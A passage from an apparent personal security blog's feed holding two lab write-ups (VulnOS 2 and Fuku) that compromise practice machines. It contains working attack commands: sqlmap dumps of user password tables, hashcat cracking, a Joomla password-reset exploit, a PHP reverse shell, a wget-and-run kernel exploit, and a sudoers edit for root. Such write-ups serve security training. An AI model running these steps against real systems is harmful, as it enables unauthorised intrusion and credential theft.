<p><code>nmap -sV -v -O -A -T5 192.168.79.104 -p-</code></p>

<p><img src="/images/blog/vulhub/vulos2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>port 22, 80 and 6667 are opening.</p>

<p>use wfuzz to scan. Nothing interesting.</p>

<p>use Niko to scan. Same.</p>

<p>Check the webpage, looks like a link may be useful.</p>

<p><img src="/images/blog/vulhub/vulos2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Double click it.</p>

<p><img src="/images/blog/vulhub/vulos2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Exam the links. In <code>Document</code>, I found this:</p>

<p><img src="/images/blog/vulhub/vulos2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like path <code>/jabcd0cs/</code> is available.</p>

<p>go to  <code>http://192.168.56.104/jabcd0cs/</code>, I found the app is OpenDocMan v1.2.7.</p>

<p><img src="/images/blog/vulhub/vulos2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit opendocman</code></p>

<p><img src="/images/blog/vulhub/vulos2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>got the exploit. Try the sql injection vulnerability:</p>

<p><img src="/images/blog/vulhub/vulos2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<pre><code>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user" --level=5 --risk=3
</code></pre>

<p><img src="/images/blog/vulhub/vulos2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>Now I know the database type is MySQL.</p>

<p>Next try to dump all table names</p>

<pre><code>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user" --tables --dbms=mysql
</code></pre>

<p><img src="/images/blog/vulhub/vulos2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like <code>odm_user</code> is the table I want to take a look at.</p>

<p>now dump columns from table <code>odm_user</code></p>

<p><code>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user" -T odm_user  --columns --dbms=mysql</code></p>

<p><img src="/images/blog/vulhub/vulos2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like <code>username</code> and <code>password</code></p>

<p>now time to dump all content from <code>username</code> and <code>password</code>,</p>

<p><code>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user" -C username,password --dump --dbms=mysql</code></p>

<p><img src="/images/blog/vulhub/vulos2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>use hash-identifier to detect hash type</p>

<p><img src="/images/blog/vulhub/vulos2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like they are MD5.</p>

<p>use hashcat to crack it</p>

<p><code>hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code></p>

<p><img src="/images/blog/vulhub/vulos2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>only guest&rsquo;s password is cracked.</p>

<p>Find a very good website to crack MD5 online <a href="http://md5cracker.org/,">http://md5cracker.org/,</a> get the cracked password <code>webmin1980</code> for user webmin, and login:</p>

<p><img src="/images/blog/vulhub/vulos2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>not very helpful.</p>

<p>Try to ssh to the box using webmin</p>

<p><img src="/images/blog/vulhub/vulos2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>get the bash:</p>

<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p>first check the os version</p>

<p><code>uname -a</code></p>

<p><img src="/images/blog/vulhub/vulos2/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit 3.13.0</code></p>

<p><img src="/images/blog/vulhub/vulos2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>try this exploit</p>

<p>in Kali:</p>

<pre><code>cp /usr/share/exploitdb/platforms/linux/local/37292.c /var/www/html/.
service apache2 restart
</code></pre>

<p>in target:</p>

<pre><code>wget http://192.168.56.101/37292.c .
gcc 37292.c -o 37292
./37292
</code></pre>

<p><img src="/images/blog/vulhub/vulos2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SecTalks: BNE0x02 - Fuku]]></title>
    <link href="http://wg135.github.io/blog/2016/07/18/sectalks-bne0x02-fuku/"/>
    <updated>2016-07-18T16:00:27-05:00</updated>
    <id>http://wg135.github.io/blog/2016/07/18/sectalks-bne0x02-fuku</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Netcat</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Joomscan</li>
</ul>


<h3>Vulnerability:</h3>

<ul>
<li><a href="https://www.exploit-db.com/exploits/6234/">Joomla 1.5.x - (Token) Remote Admin Change Password</a></li>
<li><a href="https://www.exploit-db.com/exploits/38775/">Chkrootkit - Local Privilege Escalation</a></li>
<li><a href="https://www.exploit-db.com/exploits/33673/">Joomla HD FLV Player SQL Injection Vulnerability</a></li>
</ul>


<!--more-->


<h3>Use Joomla! Remote Admin Chnage Password Exploit</h3>

<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture1.JPG" title="[title manually exploit [alt text]]" ></p>

<p>192.168.56.134 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.56.134 -p-</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture2.JPG" title="[title manually exploit [alt text]]" ></p>

<p>as we can see, almost every port is opening. I guess the target machine doesn&rsquo;t want hacker know which services are exactly running.</p>

<p>I use nc to read some ports such as 80 22 23. Port 22 gets result like:</p>

<pre><code>SSH-2.0-OpenSSH 6.7p1 Ububtu-5ubuntu1
</code></pre>

<p>while the rest of ports get the results:</p>

<p><img src="/images/blog/vulhub/fuku/Capture14.JPG" title="[title manually exploit [alt text]]" ></p>

<p>looks like I need to filter ports like these. I wrote a script to make life easier <a href="https://github.com/wg135/script/blob/master/filter.py">filter.py</a></p>

<p>After running the script, I find only port 22 and port 13370 are opening.</p>

<p>check the <a href="http://192.168.56.134:13370.">http://192.168.56.134:13370.</a> I got this</p>

<p><img src="/images/blog/vulhub/fuku/Capture3.JPG" title="[title manually exploit [alt text]]" ></p>

<p>review the code:</p>

<p><img src="/images/blog/vulhub/fuku/Capture4.JPG" title="[title manually exploit [alt text]]" ></p>

<p>Looks like Joomla!</p>

<p>use wfuzz to scan</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.134:13370/FUZZ 2&gt;/dev/null</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture5.JPG" title="[title manually exploit [alt text]]" ></p>

<p>get some interesting path names</p>

<p>use Nikto to scan</p>

<p><code>nikto -h http://192.168.56.134:13370</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture6.JPG" title="[title manually exploit [alt text]]" ></p>

<p>check <a href="http://192.168.56.134:13370/administrator/">http://192.168.56.134:13370/administrator/</a> get the login page:</p>

<p><img src="/images/blog/vulhub/fuku/Capture7.JPG" title="[title manually exploit [alt text]]" ></p>

<p>Now I can confirm it is Joomla!</p>

<p>use joomscan to scan:</p>

<p><code>joomscan -u http://192.168.56.134:13370</code></p>

<p>get the result:</p>

<p><img src="/images/blog/vulhub/fuku/Capture8.JPG" title="[title manually exploit [alt text]]" ></p>

<p>follow the steps:</p>

<ul>
<li>go to <a href="http://192.168.56.134/index.php?option=com_user&amp;view=reset&amp;layout=confirm">http://192.168.56.134/index.php?option=com_user&amp;view=reset&amp;layout=confirm</a></li>
<li>Write into field &ldquo;token&rdquo; char &lsquo; and Click OK.</li>
</ul>


<p><img src="/images/blog/vulhub/fuku/Capture15.JPG" title="[title manually exploit [alt text]]" ></p>

<ul>
<li>input new password for admin</li>
</ul>


<p><img src="/images/blog/vulhub/fuku/Capture16.JPG" title="[title manually exploit [alt text]]" ></p>

<ul>
<li>go to <a href="http://192.168.56.134/administrator/">http://192.168.56.134/administrator/</a> to login with new password</li>
</ul>


<p><img src="/images/blog/vulhub/fuku/Capture9.JPG" title="[title manually exploit [alt text]]" ></p>

<p>Since it is Japanese version, I followed my post <a href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/">sickos1.2</a> to upload php reverse shell (usr/share/webshells/php/php-reverse-shell.php).</p>

<p><img src="/images/blog/vulhub/fuku/Capture17.JPG" title="[title manually exploit [alt text]]" ></p>

<p>I will edit beez file, copy the php reverse shell code to it and replace the IP address and port</p>

<p><img src="/images/blog/vulhub/fuku/Capture10.JPG" title="[title manually exploit [alt text]]" ></p>

<p>set up netcat and get the shell</p>

<p><img src="/images/blog/vulhub/fuku/Capture11.JPG" title="[title manually exploit [alt text]]" ></p>

<p>However, I cannot execute most commands even <code>python</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture12.JPG" title="[title manually exploit [alt text]]" ></p>

<p>try:</p>

<p><code>python2.7 -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p>works!</p>

<p>Now try to enumerate the os.</p>

<p><code>ps aux |grep root</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture18.JPG" title="[title manually exploit [alt text]]" ></p>

<p>looks like the <code>chkrootkit 0.49</code> is available.</p>

<p>I followed my previous post <a href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/">sickos1.2</a> to upload php reverse shell (usr/share/webshells/php/php-reverse-shell.php) to get the root:</p>

<pre><code>echo 'chmod 777 /etc/sudoers &amp;&amp; echo "www-data ALL=NOPASSWD: ALL" &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers' &gt; /tmp/update
</code></pre>

<p>then:</p>

<p><code>chmod 777 /tmp/update</code></p>

<p>then:</p>

<p><code>ls -al /etc/sudoers</code></p>

<p>finally get the root:</p>

<p><code>sudo su</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture13.JPG" title="[title manually exploit [alt text]]" ></p>

<h3>Exploit Joomla HD FLV Player SQL Injection</h3>

<p>in <a href="http://192.168.56.134/,">http://192.168.56.134/,</a> I found the target uses HD FLV Player</p>

<p><img src="/images/blog/vulhub/fuku/Capture19.JPG" title="[title manually exploit [alt text]]" ></p>

<p>check the source code:</p>

<p><img src="/images/blog/vulhub/fuku/Capture20.JPG" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit HD FLV</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture25.JPG" title="[title manually exploit [alt text]]" ></p>

<p>follow the instructions:</p>

<pre><code>sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&amp;id=1" -p id --dbms mysql --tables --level=5 --risk=3
</code></pre>

<p><img src="/images/blog/vulhub/fuku/Capture21.JPG" title="[title manually exploit [alt text]]" ></p>

<p>now get the columns of the table <code>jos_users</code></p>

<pre><code>sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&amp;id=1" -p id --dbms mysql -T jos_users --columns
</code></pre>

<p><img src="/images/blog/vulhub/fuku/Capture22.JPG" title="[title manually exploit [alt text]]" ></p>

<p>now I am interested in column username and password</p>

<pre><code>sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&amp;id=1" -p id --dbms mysql -T jos_users -C username,password --dump
</code></pre>

<p><img src="/images/blog/vulhub/fuku/Capture23.JPG" title="[title manually exploit [alt text]]" ></p>

<p>The first part should be hash and the second part should be salt. I used joomla password crack tool <a href="https://github.com/wg135/script/blob/master/joomla.pl">joomlacrack.pl</a>. Here is also my python version <a href="https://github.com/wg135/script/blob/master/crackjoomla.py">crackjoomla.py</a></p>

<p>crack admin&rsquo;s password now</p>

<p><img src="/images/blog/vulhub/fuku/Capture26.JPG" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/fuku/Capture24.JPG" title="[title manually exploit [alt text]]" ></p>

<p>Then login as admin, upload php reverse shell, same as I worked in the first part of this post.</p>

<p>Aslo, since the hash format is like hash:salt. I found the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat example hashes</a>, the MD5 format should be <code>md5($pass.$salt)</code>, so that in hashcat for option <code>-m</code> the value should be 10 (hashcat &ndash;help, check the * Hash types)</p>

<p>use hashcat crack:</p>

<p><code>hashcat -m 10 -a 0 -o joompass.txt --remove 61.hash /usr/share/wordlists/rockyou.txt</code></p>

<p>DONE</p>
]]></content>
  </entry>
  
</feed>
